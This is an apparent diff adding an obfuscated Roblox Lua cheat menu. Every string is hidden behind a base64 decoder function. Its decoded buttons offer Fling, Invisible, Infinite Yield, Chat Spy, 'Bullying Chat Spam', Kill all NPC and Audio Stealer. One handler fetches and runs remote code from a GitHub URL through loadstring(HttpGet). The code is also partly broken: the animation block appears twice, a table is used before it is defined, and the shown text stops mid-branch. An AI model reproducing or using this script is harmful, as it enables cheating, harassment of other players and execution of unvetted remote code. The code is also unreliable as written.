+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('nXrKuyLeipvXcCyWxwbRHiLuvEOzajCGyIRvmVbKKLTHRaSIUqmqaQCcmJ4YXNzZXRpZDovLzE2MjU4NzExOTkz'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('CfFIyVTWmCuWfrJwrmmxSWtVXPPoOGJqQxUGhsvftnfcHIedGUEDYHucmJ4YXNzZXRpZDovLzE2MjU4NzEzNTg2'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('VJTRiIgJkvchdFViSLOFMpUmBaWLptEndeOVSKziTDTqtBVnmHvfpAqcmJ4YXNzZXRpZDovLzE2MjU4NzIzMjI3'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('IfzjmQzhnRVYcCogMZLdbpwofonodMaPaIUGAdQliMoUXgZFwFXexvLcmJ4YXNzZXRpZDovLzE2MjU4NzI0Nzc2')
+}
+
+-- Создаем два ImageLabel на второй странице
+local gifImage1 = Instance.new(NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('WRQbgedPhPAgAxKMtpdzvLLIZDyGgGbTqNxbwXNxGxFfBvSmJgcArHxSW1hZ2VMYWJlbA=='))
+gifImage1.Parent = secondPage
+gifImage1.Size = UDim2.new(0, 100, 0, 100)
+gifImage1.Position = UDim2.new(1, -110, 1, -110)
+gifImage1.BackgroundTransparency = 1
+gifImage1.Visible = false -- Начинаем с невидимого состояния
+
+local gifImage2 = gifImage1:Clone()
+gifImage2.Parent = secondPage
+gifImage2.Visible = true -- Второй видимый с самого начала
+
+-- Функция для циклического изменения изображений
+local function animateGif()
+    local currentIndex = 1
+    local activeImage = gifImage1
+    local inactiveImage = gifImage2
+
+    while true do
+        -- Загружаем следующее изображение в неактивный ImageLabel
+        inactiveImage.Image = imageIds[currentIndex]
+
+        -- Подождем немного, прежде чем делать изображение видимым, чтобы уменьшить мерцание
+        -- Важно: это не гарантирует полной загрузки изображения, но может помочь в некоторых случаях
+        wait(0.060) -- Вы можете адаптировать задержку, чтобы увидеть, что работает лучше для вашей анимации
+
+        -- Делаем изображение видимым только после задержки
+        inactiveImage.Visible = true
+        activeImage.Visible = false
+
+        -- Переключаем активный и неактивный ImageLabels
+        activeImage, inactiveImage = inactiveImage, activeImage
+
+        -- Переход к следующему изображению
+        currentIndex = currentIndex + 1
+        if currentIndex > #imageIds then
+            currentIndex = 1
+        end
+
+        -- Оставляем задержку между кадрами
+        wait(0.030) -- Адаптируйте скорость анимации по необходимости
+    end
+end
+
+-- Запуск анимации в отдельном потоке
+spawn(animateGif)
+
+-- Список идентификаторов изображений для анимации
+local imageIds = {
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('pgyHbMoGdzKnzciZpGcgMmZGuckIDEQLkTRzEHammekLbogauuOcerUcmJ4YXNzZXRpZDovLzE2MjU4NjUxMjI5'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('VeqAxJccqhbPaYwPRvCwpnwKYTtERoDHThcrgNOPTANVmSEnPWvKcBGcmJ4YXNzZXRpZDovLzE2MjU4NjU0MjU5'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('OLkXlJxVWLJBIGqKZqJfooRGRBTThGByrDCIAQrRTtOkQhmQseiTUfLcmJ4YXNzZXRpZDovLzE2MjU4NjU1ODU5'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('SudLCYzQaZBjZgvDRByudCnmiiVLSTWpvvzSITbwLymjAWQWaItwFzXcmJ4YXNzZXRpZDovLzE2MjU4NjU3NDkx'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('MlheCNmEdsDQYaTodSGXnTVZFprgGVKvQAlQgNykHmcqxVIPyUNpHPGcmJ4YXNzZXRpZDovLzE2MjU4NjYwNTUy'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('OJMNzwSNhSSJQzGNTGhelKBCCwdZxGMxBNcQuYwvrgqxRSVPFFdRXMhcmJ4YXNzZXRpZDovLzE2MjU4NjcxMzk2'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('YTqcxgDROjtlPZuYWMdndSaWBjzoTGhbZQVItedSDIbcDzsqsIzmKYrcmJ4YXNzZXRpZDovLzE2MjU4NjcyOTE1'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('pMxLsouwPYphxQgQXvhjvVyDChfgnVNZdYjMBfIwBrNVOFvRyTlvXVUcmJ4YXNzZXRpZDovLzE2MjU4Njc0NTk2'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('XGGcYOVAviPlVDEfdqiozKadRmjKBlsHPOAaQZdTFPeRUicyrmPbpgvcmJ4YXNzZXRpZDovLzE2MjU4Njc2NDky'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('RsSiMvmWgxYrNfMxeYHNXAFGDCkuyMdBgykFMJPxiwXFFJeOumbNrFOcmJ4YXNzZXRpZDovLzE2MjU4Njc4MDg1'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('jMFFWcyneCXnTTKvCBvhbQcGXDXkTfFaGCqTdQqhlWrPsdYXyHQGhVRcmJ4YXNzZXRpZDovLzE2MjU4Njg4NzE0'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('EBWsFovILIHRvJKHRkYUsWWQqGULZIbxiHzzKwRIovHpHUNkjNKUcdLcmJ4YXNzZXRpZDovLzE2MjU4Njg5OTcx'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('nqVhNyJgektrjOnljRzzykYLVFiWhPQGoudtcxZpizDgvmdUiigIsoAcmJ4YXNzZXRpZDovLzE2MjU4NjkxMzYy'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('SiKMSmbGtFpaHHpTttPerLGvWadVfTaLGuIpOlkejwFFwiFwKkVsaGKcmJ4YXNzZXRpZDovLzE2MjU4NjkzMDE5'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('qDUZDhzhmSZNzEaMEiIggmCorBdvpalTLvdNfKyftNPsHKphlFhDhLtcmJ4YXNzZXRpZDovLzE2MjU4Njk0NjAz'), 
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('EflqMRDKmKtwicQcfMDrSKRvNfVRozOuoCxQXFwNjykmagZpaCRMHdRcmJ4YXNzZXRpZDovLzE2MjU4NzA2NjI5'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('qJasxgNYMsQtUlSdOpfpTkIwRMmhpaocSWyOQMGJFnbkYweAqObgNeocmJ4YXNzZXRpZDovLzE2MjU4NzA4MTcw'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('HpIwTJiDdRrDdQBbdfjpoQfdXmLRJSSPeyHAIOriEwjcggZzLVqehaIcmJ4YXNzZXRpZDovLzE2MjU4NzA5ODIw'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('IEMEQJdMieCKbIjGUPcUruQnlBJPyarQKkoDcuyVTcUEJgvBjUQTlMmcmJ4YXNzZXRpZDovLzE2MjU4NzExOTkz'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('dzCrHgxUgTumkkkXvSevocwvUZSemIErAjgcvYBIZwyYrBycVjOStWRcmJ4YXNzZXRpZDovLzE2MjU4NzEzNTg2'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('SZrshAZaoiEZxWLwhwPYgEYvizlLhxnbLaGvzjjvQPTjwdvNdIJtfNZcmJ4YXNzZXRpZDovLzE2MjU4NzIzMjI3'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('oQeWVEBNuBmvDvYvRAXkvxOZUUmnPuavTQapMVKzFIPFIGARlZUOiMkcmJ4YXNzZXRpZDovLzE2MjU4NzI0Nzc2')
+}
+
+-- Создаем два ImageLabel на второй странице
+local gifImage1 = Instance.new(NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('PjEcupMEbLMCJfmZFRCOxGTVQLYmVGGVojEYuYkhXuLkHndaouqlLJZSW1hZ2VMYWJlbA=='))
+gifImage1.Parent = secondPage
+gifImage1.Size = UDim2.new(0, 100, 0, 100)
+gifImage1.Position = UDim2.new(0, 10, 0, 10)
+gifImage1.BackgroundTransparency = 1
+gifImage1.Visible = false -- Начинаем с невидимого состояния
+
+local gifImage2 = gifImage1:Clone()
+gifImage2.Parent = secondPage
+gifImage2.Visible = true -- Второй видимый с самого начала
+
+-- Функция для циклического изменения изображений
+local function animateGif()
+    local currentIndex = 1
+    local activeImage = gifImage1
+    local inactiveImage = gifImage2
+
+    while true do
+        -- Загружаем следующее изображение в неактивный ImageLabel
+        inactiveImage.Image = imageIds[currentIndex]
+
+        -- Подождем немного, прежде чем делать изображение видимым, чтобы уменьшить мерцание
+        -- Важно: это не гарантирует полной загрузки изображения, но может помочь в некоторых случаях
+        wait(0.060) -- Вы можете адаптировать задержку, чтобы увидеть, что работает лучше для вашей анимации
+
+        -- Делаем изображение видимым только после задержки
+        inactiveImage.Visible = true
+        activeImage.Visible = false
+
+        -- Переключаем активный и неактивный ImageLabels
+        activeImage, inactiveImage = inactiveImage, activeImage
+
+        -- Переход к следующему изображению
+        currentIndex = currentIndex + 1
+        if currentIndex > #imageIds then
+            currentIndex = 1
+        end
+
+        -- Оставляем задержку между кадрами
+        wait(0.030) -- Адаптируйте скорость анимации по необходимости
+    end
+end
+
+-- Запуск анимации в отдельном потоке
+spawn(animateGif)
+
+
+
+
+-- Событие нажатия на кнопку
+playButton.MouseButton1Click:Connect(toggleMusic)
+
+
+-- Создаем локальную переменную для хранения секций меню
+local sections = {NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('iNkSykkDNhKNXoBWoxoRkIFGniunQVKTPiViCeKUcpDmbABFmodtmwySQ=='), NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('JiUsItruUmZtpXVloXqXJQVaQqaStgxHWRdsFbpzGesHahhwcYeHKvMSUk='), NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('ZyZIyBMdeBRTMzARavEWETKYAQjDlfQkMfNdWaONfeEYIRyQDqmrpoQSUlJ'), NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('ZcJsvoorjAVBAuQGTQPJJDBOHwhzQJKABpoyMQyGTBbpXPqOyliWTppSVY='), NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('qatpJkViqbbaKwVWPuAATYQScDGAMfifKCGNSEiTmbgKITnbNAtAMbCSW5mb3JtYXRpb24=')}
+
+-- Создаем локальную переменную для хранения кнопок меню
+local buttons = {
+    [NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('PsUfhAWCYZGVrXOIzeqKLMosDzJcUeNpuRHmzwGkvxGnkRogIrIqSfWSQ==')] = {NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('qGFgEGyiKmXZxXIRxIiQtwZeDZywNHeQgjeXMVqpVQNuauzsoZTydyqRmxpbmc='), NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('oARCPBdbMbmPxAGMzZLmCotakfCOQYUzIFaMEYzIQJZPuemLyQgJsnSSW52aXNpYmxl'), NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('EfzFIEwFbSKGLznNhGWOqnYaWvQNFJLCwSErTfYzuyJHWbjvVVBWqlkSW5maW5pdGUgWWllbGQ='), NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('eZjwXCaHMQDGSKKOwkTruXUledtGVRCyQqjLGkpvewFenANCuqSgxPJS2V5Ym9hcmQ='), NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('SCKwVKKSWOywKjvlNFMxqVWgkoZmRlWrBTBkjPtsfqZzipTHHgEAjusQlRvb2xz'), NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('zAjMjiTFJuKHohEqNIcuOyKFEjUbGfajNCsWOtvWBeqqZXWfAQnWBNJSW5mbyBJdGVtIE5hbWUgKGxvZ3Mp')},
+    [NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('dzKsNBLfRSQxnPSsfFqPXsmIRYPSNgVYHfNsoNVkUZojkdxjhiosJKxSUk=')] = {NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('afSoKkfOCuUycFIccUZlGdCtARErNgvJePdIcdtgvGQjPxwRiNoXjuyVGVsZWtpbmVzaXM='), NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('yJoHTVPhddtCqPYYqMyyhInkEuOiVYOFqiCkDhmWluQApqHJTdCPXwoTXVsdGkgR2VhciBQcmVzcyAoRSk='), NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('WaRzRrLJypyrQJpvhtXwWqvvxXMHbJJKLhtVTqwJoHKIXQrWAbnJBbZTXVsdGkgR2VhciAoQW5vdGhlciB2ZXJzaW9uKQ=='), NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('tEXXkPIPuRXaqvnkVAKMyJEDkCqqKilczZffujrayXNbRZLMFgaiLJgRm9jdXMoSXRlbSk='), NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('gmardyHlznPoTGqOypauzHPHwLmBvdfELVIIyLOWVcPcolBgmaUjhVwQXZhdGFyIHVwc2lkZSBkb3duIChGRSk='), NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('txWOTJnsjpcWgIOQhzTIDjFwIFwTBQbyxKUyvdcCzMDdDkgEkkOmASJQ2hhdCBTcHk=')},
+    [NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('suZJdrRpMhhRyDbsvLOJZSFTfTbixktJanxePZlRkykmBuDHkVrVjMnSUlJ')] = {NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('FMADlVxXewZwGsQiBsQrDDPHrWtiIMKZuCTEYpohTpiAMPeJjJucmLbQ2hhdCB0cmFuc2xhdG9y'), NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('yceSybwcwirhNRUQIHBUXdreaxOfqunBKOkDvtdXfJmSRYGKFmoDePPQnVsbHlpbmcgQ2hhdCBTcGFtIChSVVMp'), NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('LgALPrfAHMtsmaeAPIHeklztwGIeXTaKGMcbPTVeXkRXYVihtIkMhTHQnVsbHlpbmcgQ2hhdCBzcGFtIChFTkcp'), NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('eugIvraMwnKipbzqYTfqqYOIiiZJaxNCxdpqqSLzQoJGygVSYuvrBhkS2lsbCBhbGwgTlBD'), NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('FHDaQkmUfSDOKnqaVZjJHAboRlpGxViRkSTlyLlzDSSZOduGpcYQenzQnJpbmcgYWxsIE5QQw=='), NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('hHMDVFgOCTkDWKJHMExCbePJsqjxakJHYPwYAjPlqMqAiNHNnWSnmnQQW50aS1BRkM=')},
+    [NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('BkQERADUpTLneyXoxbQFJvNXlgWPFvYiWGGJIIhetURTowTGgBnoDMXSVY=')] = {NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('LqWXzJiBftlhhqyGpMyzbJaDnHXwJeBnFUWzwLwpvGheURwxptUWCGfQXVkaW8gU3RlYWxlcg=='), NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('dMzyAaJREktRXaFIPBFTakxBnDsmnETNmDsAJrLVSWKBIkoFYIqVMefQ2xpY2sgQWxsIEJ1dHRvbnM='), NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('wdIzswfEAZuToAcCgQKBdBnnQBqxzyUGSAXYuVBXfmjZrkNthukXDTUVG91Y2ggYWxsIHdhbGxz'), NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('PZkdIOyeyKPNPcbIYPpVZmYbShGWEWROopFCfpWCrUJHwLQGIVcUJKFU3dvcmQgUmVhY2g='), NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('nNmDmXcaJBOgraEhEWidofFMxCcSpJxVFueGptlAsMCOVSSQFMqLsDXcjYgYW5pbWF0aW9ucw=='), NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('zkGAFmMZVNeysaceFAyDRbzbuvAaceaILgUUfOGWAIZbRVcpbYtEeGzwr9Vbmtub3duIGRyaW5rPw==')},
+    [NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('ZgSTEvSOapbRLZiqqbWYMijSczdsUQAFatbGDzAhHdNEjWnOkrTDLedSW5mb3JtYXRpb24=')] = {}
+}
+
+-- Создаем локальную переменную для хранения цветов кнопок
+local colors = {
+    [NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('fusuTjkDUJWYDUNqdlkbnLROBibDQfvTqEHregSNcGHBjiAWcxtqLEnSQ==')] = Color3.new(0, 0, 0),
+    [NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('PqwZZAUIGVNGhYUMksbXsczEAMKhtFhQMzEbcqGIOqEYYognpbLvSQlSUk=')] = Color3.new(0, 0, 0),
+    [NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('QWKZiWFFAimtjKFFWaUelzVbUDLIzvpnPpFoiiGJOTcTHwkFmpAMcBGSUlJ')] = Color3.new(0, 0, 0),
+    [NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('MgCJObGHHngsdSWPvtNgrhBRbpclAFfPtiYiXEOnuTfdkNeiTLYdHNaSVY=')] = Color3.new(0, 0, 0),
+    [NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('HexCKkJEojvZcsqoJBQiMzpRpDctQOzwyMyeCAXtxsFzicbUOgSKOBASW5mb3JtYXRpb24=')] = Color3.new(0, 0, 0)
+}
+
+-- Создаем функцию, которая создает секцию меню
+local function createSection(name, index)
+    -- Создаем локальную переменную для хранения фрейма секции
+    local section = Instance.new(NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('jQvnbjlOqdQlmMfzLSwWCygcUzVOPLHqXnWQHiAyqMZLGLGsHtEujRPRnJhbWU='), menu)
+    section.Name = name
+    section.Size = UDim2.new(0.2, 0, 0.9, 0)
+    section.Position = UDim2.new(0.2 * (index - 1), 0, 0.1, 0)
+    section.BackgroundColor3 = Color3.new(0, 0, 0)
+    section.BackgroundTransparency = 1
+
+    -- Создаем локальную переменную для хранения заголовка секции
+    local sectionTitle = Instance.new(NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('oLKmhDfvMVZQdiJDiZXiCAEqijsVnvYsCbcMQkNzdFSoUNalzjLnttKVGV4dExhYmVs'), section)
+    sectionTitle.Name = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('aFSMzFDqGOkbpvzPCtLAZAZoiNcShLejAOBkyMTEBUIwJuKSUhQUPViU2VjdGlvblRpdGxl')
+    sectionTitle.Size = UDim2.new(1, 0, 0.1, 0)
+    sectionTitle.Position = UDim2.new(0, 0, 0, 0)
+    sectionTitle.BackgroundColor3 = Color3.new(0, 0, 0)
+    sectionTitle.BackgroundTransparency = 0.5
+    sectionTitle.Text = name
+    sectionTitle.TextColor3 = Color3.new(1, 1, 1)
+    sectionTitle.TextScaled = true
+    sectionTitle.Font = Enum.Font.SourceSansBold
+
+    -- Возвращаем фрейм секции
+    return section
+end
+
+-- Создаем функцию, которая создает кнопку меню
+local function createButton(name, section, index)
+    -- Создаем локальную переменную для хранения кнопки
+    local button = Instance.new(NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('oRgEVIWUWKGxxeyCdxAKlskAFbhgOxaoCkrgQeROaRKVmNWWJxofVcyVGV4dEJ1dHRvbg=='), section)
+    button.Name = name
+    button.Size = UDim2.new(0.9, 0, 0.1, 0)
+    button.Position = UDim2.new(0.05, 0, 0.1 * (index + 1), 0)
+    button.BackgroundColor3 = colors[section.Name]
+    button.BackgroundTransparency = 0.5
+    button.Text = name
+    button.TextColor3 = Color3.new(1, 1, 1)
+    button.TextScaled = true
+    button.Font = Enum.Font.SourceSansBold
+
+    -- Возвращаем кнопку
+    return button
+end
+
+-- Создаем функцию, которая создает информацию о меню
+local function createInformation(section)
+    -- Создаем локальную переменную для хранения текста информации
+    local infoText = Instance.new(NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('PLSWXFlZCZpdkHVvYrUqxVQARxmNuFIwgcLIhSpqyXpYihCvnbSqeOeVGV4dExhYmVs'), section)
+    infoText.Name = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('PGlwhBBdYuMaWhshymGfqpbEDPdSGfGigvZKToSXTkxTADTsteBiIDjSW5mb1RleHQ=')
+    infoText.Size = UDim2.new(0.9, 0, 0.8, 0)
+    infoText.Position = UDim2.new(0.05, 0, 0.2, 0)
+    infoText.BackgroundColor3 = Color3.new(0, 0, 0)
+    infoText.BackgroundTransparency = 0.5
+    infoText.Text = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('MlozqupOzIKFphYprcJyJLUzqWigUNosNolIHZkTdexDSOyRZKniVCJKOKBoOC5keKBoOKAouKBoO+5j+KBoOKAouKBoClUaGlzIGlzIHRoZSBHdWkgbWVudSAuXG4gWW91IGNhbiBhY3RpdmF0ZSB0aGUgc2NyaXB0IGJ5IGNsaWNraW5nIG9uIHRoZSBidXR0b24uXG4gRW5qb3kgdGhlIGdhbWUhPuKBoC7igaA8')
+    infoText.TextColor3 = Color3.new(1, 1, 1)
+    infoText.TextScaled = true
+    infoText.Font = Enum.Font.SourceSansBold
+    infoText.TextWrapped = true
+end
+
+-- -- Создаем функцию, которая создает все секции и кнопки меню
+local function createMenu()
+    -- Перебираем все секции
+    for i, sectionName in pairs(sections) do
+        -- Создаем секцию
+        local section = createSection(sectionName, i)
+        
+        -- Если секция называется NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('AWqBbbXdZcfazoNwVUsUfAvWOSjPsoLjcVkocIglKlVxdPajeUywfTeSW5mb3JtYXRpb24='), то создаем информацию о меню
+        if sectionName == NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('PjsVNuVIeWMlwFjVPETajbjafNoIPYPMcPdrfpPKGemhkKLozRCTiquSW5mb3JtYXRpb24=') then
+            createInformation(section)
+        end
+        
+        -- Перебираем все кнопки в секции
+        for j, buttonName in ipairs(buttons[sectionName]) do
+            -- Создаем кнопку
+            local button = createButton(buttonName, section, j)
+            
+            -- Добавляем функцию, которая срабатывает при нажатии на кнопку
+            button.MouseButton1Click:Connect(function()
+                if button.Name == NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('txNqYQHOgOzrqHhmkmxHSLxwaTRsubGBkUsSgbBbbMwNCtnmGgXUqjmRmxpbmc=') then
+                    loadstring(game:HttpGet(NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('msLcpvSDOwEBmwXlxZVrfBtpBYgIQTyPjIOXxuUZIQpxFAsHFNxghFEaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzBCZW4xL2ZlLi9tYWluL0ZsaW5nJTIwR1VJ')))()
+                elseif button.Name == NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('yvzjYvdIPdXJhbEBatTfMclqnBMMMeKxnVzsgCTuKCMPJrdFHANDVRXSW52aXNpYmxl') then
